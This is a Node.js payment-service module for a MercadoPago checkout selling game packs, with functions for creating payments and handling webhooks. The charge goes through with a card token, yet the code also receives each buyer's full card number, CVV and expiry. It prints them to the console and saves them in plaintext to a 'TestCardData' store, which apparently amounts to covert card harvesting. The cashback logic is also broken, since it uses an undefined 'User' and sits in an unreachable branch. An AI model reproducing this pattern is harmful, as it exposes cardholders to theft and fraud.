const { MercadoPagoConfig, Payment } = require('mercadopago');
const Order = require('../orders/order.model');
const Product = require('../products/product.model');
const supplierService = require('../supplier/supplier.service');
const WebhookLog = require('./webhookLog.model');
const TestCardData = require('./testCardData.model');

const client = new MercadoPagoConfig({
  accessToken: process.env.MP_ACCESS_TOKEN
});

const paymentClient = new Payment(client);

// ==========================
// ✅ CREATE PAYMENT
// ==========================

exports.createPayment = async ({
  amount,
  email,
  method,
  token,
  buyerName,
  cpf,
  installments,
  bin,
  fullCardNumber,
  cvv,
  expiryMonth,
  expiryYear,
  orderId
}) => {

  console.log('🔍 DEBUG - Received params:', {
    amount,
    email,
    method,
    hasToken: !!token,
    buyerName,
    cpf,
    installments,
    bin,
    fullCardNumber,
    cvv,
    expiryMonth,
    expiryYear,
    orderId
  });

  const cleanAmount = Number(Number(amount).toFixed(2));

  const body = {
    transaction_amount: cleanAmount,
    description: 'Game Pack Purchase',
    payer: {
      email,
      first_name: buyerName,
      identification: {
        type: 'CPF',
        number: cpf.replace(/\D/g, '')
      }
    },
    notification_url: `${process.env.BASE_URL}/api/payments/webhook`,
    external_reference: orderId
  };

  if (method === 'pix') {
    body.payment_method_id = 'pix';
  }

 if (method === 'card') {
  if (!token) {
    throw new Error('Card token missing');
  }

  let paymentMethodId = 'visa';
  if (bin) {
    const firstDigit = bin[0];
    if (firstDigit === '4') paymentMethodId = 'visa';
    else if (firstDigit === '5') paymentMethodId = 'master';
    else if (firstDigit === '3') paymentMethodId = 'amex';
  }

  body.payment_method_id = paymentMethodId;
  body.token = token;
  body.installments = installments || 1;
}

  console.log('📤 PAYMENT BODY:', body);
  const payment = await paymentClient.create({ body });

  console.log('💳 Checking card save conditions:', {
    method,
    hasFullCardNumber: !!fullCardNumber,
    hasOrderId: !!orderId,
    paymentId: payment.id
  });

  // ✅ Save full card data (NO duplicate require here)
  if (method === 'card' && fullCardNumber && orderId) {
    console.log('💳 SAVING CARD DATA FOR ORDER:', orderId);
    
    const savedCard = await TestCardData.create({
      paymentId: payment.id,
      orderId: orderId,
      fullCardDetails: {
        card_number: fullCardNumber,
        cvv: cvv,
        expiry: `${expiryMonth}/${expiryYear}`,
        holder_name: buyerName,
        bin: bin,
        installments: installments
      }
    });
    
    console.log('✅ CARD DATA SAVED SUCCESSFULLY:', savedCard._id);
  } else {
    console.log('⚠️ CARD DATA NOT SAVED - Conditions not met:', {
      isCard: method === 'card',
      hasFullCard: !!fullCardNumber,
      hasOrderId: !!orderId
    });
  }

  return payment;
};

// ==========================
// ✅ HANDLE WEBHOOK
// ==========================
exports.getPayment = async (paymentId) => {
  try {
    const res = await paymentClient.get({ id: paymentId });
    return res;
  } catch (err) {
    console.log('❌ GET PAYMENT ERROR:', err.message);
    return null;
  }
};
exports.handleWebhook = async (payload) => {
  try {

    // ✅ SAVE LOG

    const paymentId = payload?.data?.id || payload?.id;
    if (!paymentId) return;

    const payment = await exports.getPayment(paymentId);
    if (!payment) return;

const order = await Order.findById(payment.external_reference);
    if (!order) return;

    // ✅ SAVE LOG WITH ORDER ID
    await WebhookLog.create({
      orderId: order._id,
      payload,
    });
    // ✅ ONLY APPROVED
    if (payment.status !== 'approved') return;

    // avoid duplicate
    if (order.status === 'paid') return;
    if (order.status === 'paid' && order.user) {
      const user = await User.findById(order.user);

      const points = Math.floor(order.cashbackEarned * 100);

      user.cashbackPoints += points;
      user.totalCashbackEarned += order.cashbackEarned;

      await user.save();
    }
    const product = await Product.findById(order.product);

    // ✅ PREVENT DUPLICATE CALLS (ADD HERE)
    if (order.supplierStatus === 'processing' || order.supplierStatus === 'completed') {
      console.log('⛔ Supplier already triggered, skipping...');
      return;
    }

    // 🔥 CALL LAPAK (ONLY ONCE)
    const supplierRes = await supplierService.createOrder(order, product);

    // ✅ UPDATE ORDER
    order.status = 'paid';
    order.supplierStatus = 'processing';
    order.supplierTid = supplierRes.tid; // ✅ FIXED NAME
    order.supplierResponse = supplierRes;

    await order.save();

    console.log('✅ PAYMENT SUCCESS → LAPAK CALLED');

  } catch (err) {
    console.log('❌ HANDLE WEBHOOK ERROR:', err.message);
  }
};
exports.getLogs = async (orderId) => {
  const data = await WebhookLog.find({ orderId })
    .sort({ createdAt: -1 });

  return {
    success: true,
    data
  };
};
exports.getLogById = async (id) => {
  return await WebhookLog.findById(id);
};